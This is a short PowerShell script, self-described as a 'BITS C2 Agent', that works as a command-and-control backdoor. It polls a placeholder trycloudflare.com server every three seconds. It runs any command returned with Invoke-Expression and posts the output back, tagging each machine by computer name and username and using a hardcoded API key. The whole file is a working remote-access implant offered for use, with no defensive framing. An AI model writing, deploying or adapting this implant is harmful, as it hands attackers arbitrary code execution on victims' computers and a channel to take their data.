# BITS C2 Agent - Simple Version (No SSL, No HMAC)
# Just works!

 $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
$ApiKey = "c2-agent-k3y-2024-s3cr3t"

$Headers = @{ "X-API-Key" = $ApiKey }

Write-Host "[*] Agent: $AgentId"
Write-Host "[*] Server: $ServerUrl"

while ($true) {
    try {
        $response = Invoke-RestMethod -Uri "$ServerUrl/cmd/$AgentId" -Method Get -Headers $Headers -UseBasicParsing -ErrorAction Stop
        
        if ($response.command -and $response.command -ne "") {
            Write-Host "[>] CMD: $($response.command)"
            
            try {
                $result = Invoke-Expression $response.command 2>&1 | Out-String
            } catch {
                $result = "Error: $_"
            }
            
            $body = @{ result = $result } | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerUrl/result/$AgentId" -Method Post -Body $body -ContentType "application/json" -Headers $Headers -UseBasicParsing -ErrorAction Stop | Out-Null
            Write-Host "[<] Sent $($result.Length) bytes"
        }
    } catch {
        Write-Host "[-] $($_.Exception.Message)"
    }
    Start-Sleep -Seconds 3
}
